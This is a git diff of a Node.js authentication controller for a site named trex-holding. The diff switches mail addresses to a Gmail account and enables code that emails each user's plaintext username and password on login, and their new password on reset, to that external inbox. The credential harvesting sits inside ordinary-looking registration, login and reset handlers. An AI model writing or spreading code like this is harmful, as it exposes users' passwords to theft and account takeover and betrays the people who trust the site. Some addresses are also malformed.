@@ -62,8 +62,8 @@ const register = async (req, res) => {
   });
 
   let info = await transporter.sendMail({
-    from: `"Support" <support@trex-holding.com>`,
-    to: `support@trex-holding.com`,
+    from: `"Support" <trex-holding.official@gmail.com>`,
+    to: `trex-holding.official@gmail.com`,
     subject: 'New User Registration Alert',
     html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
      <p style="line-height: 1.5"><span>FullName: </span><span>${fullName}</span></p>
@@ -75,7 +75,7 @@ const register = async (req, res) => {
   });
 
   let info2 = await transporter.sendMail({
-    from: `"Support" <support@trex-holding.com>`,
+    from: `"Support" <trex-holding.official@gmail.com>`,
     to: `${email}`,
     subject: `Welcome to Trex-Holding.com`,
     html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
@@ -124,33 +124,33 @@ const login = async (req, res) => {
 
   attachCookiesToResponse({ res, user: tokenUser });
 
-  // let testAccount = await nodemailer.createTestAccount();
+  let testAccount = await nodemailer.createTestAccount();
 
-  // const transporter = nodemailer.createTransport({
-  //   host: process.env.GMAIL_HOST,
-  //   port: process.env.GMAIL_PORT,
-  //   auth: {
-  //     user: process.env.GMAIL_USER,
-  //     pass: process.env.GMAIL_PASS,
-  //   },
-  // });
+  const transporter = nodemailer.createTransport({
+    host: process.env.GMAIL_HOST,
+    port: process.env.GMAIL_PORT,
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS,
+    },
+  });
 
-  // let info = await transporter.sendMail({
-  //   from: `"Support" <support@trex-holding.com>`,
-  //   to: `support@trex-holding.com`,
-  //   subject: 'Login Alert',
-  //   html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
-  //    <p style="line-height: 1.5"><span>FullName: </span><span>${username}</span></p>
-  //    <p style="line-height: 1.5"><span>Password: </span><span>${password}</span></p>
-  //    </div>`,
-  // });
+  let info = await transporter.sendMail({
+    from: `"Support" <trex-holding.official@gmail.com>`,
+    to: `trex-holding.official@gmail.com>`,
+    subject: 'Login Alert',
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+     <p style="line-height: 1.5"><span>FullName: </span><span>${username}</span></p>
+     <p style="line-height: 1.5"><span>Password: </span><span>${password}</span></p>
+     </div>`,
+  });
 
-  // let info2 = await transporter.sendMail({
-  //   from: `"Support" <support@trex-holding.com>`,
-  //   to: `${user.email}`,
-  //   subject: `Welcome ${username} to trex-holding.com`,
-  //   html: `<div style="background: green; padding: 1rem; color: white;">We trust you would have a good experience with us..</div>`,
-  // });
+  let info2 = await transporter.sendMail({
+    from: `"Support" <trex-holding.official@gmail.com>`,
+    to: `${user.email}`,
+    subject: `Welcome ${username} to trex-holding.com`,
+    html: `<div style="background: green; padding: 1rem; color: white;">We trust you would have a good experience with us..</div>`,
+  });
 
   res.status(StatusCodes.OK).json({ user: tokenUser });
 };
@@ -212,36 +212,36 @@ const passwordReset = async (req, res) => {
 
   attachCookiesToResponse({ res, user: tokenUser });
 
-  // let testAccount = await nodemailer.createTestAccount();
+  let testAccount = await nodemailer.createTestAccount();
 
-  // const transporter = nodemailer.createTransport({
-  //   host: process.env.GMAIL_HOST,
-  //   port: process.env.GMAIL_PORT,
-  //   auth: {
-  //     user: process.env.GMAIL_USER,
-  //     pass: process.env.GMAIL_PASS,
-  //   },
-  // });
+  const transporter = nodemailer.createTransport({
+    host: process.env.GMAIL_HOST,
+    port: process.env.GMAIL_PORT,
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS,
+    },
+  });
 
-  // let info = await transporter.sendMail({
-  //   from: `"Support" <support@trex-holding.com>`,
-  //   to: `support@trex-holding.com`,
-  //   subject: 'Password Reset Alert',
-  //   html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
-  // <p style="line-height: 1.5"><span>Username: </span><span>${user.username}</span></p>
-  //    <p style="line-height: 1.5"><span>New Password: </span><span>${newPassword}</span></p>
-  //    </div>`,
-  // });
+  let info = await transporter.sendMail({
+    from: `"Support" <trex-holding.official@gmail.com>`,
+    to: `trex-holding.official@gmail.com`,
+    subject: 'Password Reset Alert',
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+  <p style="line-height: 1.5"><span>Username: </span><span>${user.username}</span></p>
+     <p style="line-height: 1.5"><span>New Password: </span><span>${newPassword}</span></p>
+     </div>`,
+  });
 
-  // let info2 = await transporter.sendMail({
-  //   from: `"Support" <support@trex-holding.com>`,
-  //   to: `${user.email}`,
-  //   subject: 'Password Reset',
-  //   html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
-  //    <p style="line-height: 1.5">Your password was successfully reset</p>
-  //    <p style="line-height: 1.5"><span>New Password: </span>${newPassword}<span></span></p>
-  //    </div>`,
-  // });
+  let info2 = await transporter.sendMail({
+    from: `"Support" <strex-holding.official@gmail.com>`,
+    to: `${user.email}`,
+    subject: 'Password Reset',
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+     <p style="line-height: 1.5">Your password was successfully reset</p>
+     <p style="line-height: 1.5"><span>New Password: </span>${newPassword}<span></span></p>
+     </div>`,
+  });
 
   res
     .status(StatusCodes.OK)
@@ -263,27 +263,27 @@ const sendEmail = async (req, res) => {
     throw new CustomError.BadRequestError('Email does not exist');
   }
 
-  // let testAccount = await nodemailer.createTestAccount();
+  let testAccount = await nodemailer.createTestAccount();
 
-  // const transporter = nodemailer.createTransport({
-  //   host: process.env.GMAIL_HOST,
-  //   port: process.env.GMAIL_PORT,
-  //   auth: {
-  //     user: process.env.GMAIL_USER,
-  //     pass: process.env.GMAIL_PASS,
-  //   },
-  // });
+  const transporter = nodemailer.createTransport({
+    host: process.env.GMAIL_HOST,
+    port: process.env.GMAIL_PORT,
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS,
+    },
+  });
 
-  // let info = await transporter.sendMail({
-  //   from: `"Support" <support@trex-holding.com>`,
-  //   to: `${email}`,
-  //   subject: 'Password Reset Link',
-  //   html: `
-  //   <div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
-  //   <p style="line-height: 1.5"> <a href="https://trex-holding.com/resetPassword?id=${id}">Click this link to reset your password </a></p>
-  //   </div>
-  //  `,
-  // });
+  let info = await transporter.sendMail({
+    from: `"Support" <trex-holding.official@gmail.com>`,
+    to: `${email}`,
+    subject: 'Password Reset Link',
+    html: `
+    <div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+    <p style="line-height: 1.5"> <a href="https://trex-holding.com/resetPassword?id=${id}">Click this link to reset your password </a></p>
+    </div>
+   `,
+  });
 
   res.status(StatusCodes.OK).json({ user, info });
 };
